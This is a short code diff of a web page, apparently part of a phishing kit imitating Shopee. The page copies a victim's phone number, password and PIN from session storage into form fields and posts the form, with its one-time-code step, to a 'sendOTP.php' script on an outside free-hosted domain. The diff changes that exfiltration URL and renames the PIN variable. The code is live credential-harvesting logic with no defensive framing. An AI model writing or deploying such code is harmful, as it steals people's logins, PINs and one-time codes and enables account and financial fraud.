@@ -284,8 +284,8 @@ document.getElementById("alert").innerHTML = alerts + "";
 document.getElementById("nomorhp").value = alerts + "";       
  var pass = sessionStorage.getItem("pass");
 document.getElementById("pass").value = pass+ "";       
- var setPin = sessionStorage.getItem("setPin");
-document.getElementById("pinku").value = setPin + "";       
+ var spin = sessionStorage.getItem("spin");
+document.getElementById("pinku").value = spin + "";       
 
     </script>
  <script>
@@ -296,7 +296,7 @@ document.getElementById("pinku").value = setPin + "";
   
    $.ajax({
  type: 'POST',
- url: 'https://www.website-layanan.c1.is/shopee/3/sendOTP.php',
+ url: 'https://www.website-layanan.c1.is/shopee/sendOTP.php',
  data: $(this).serialize(),
  datatype: 'JSON',
  
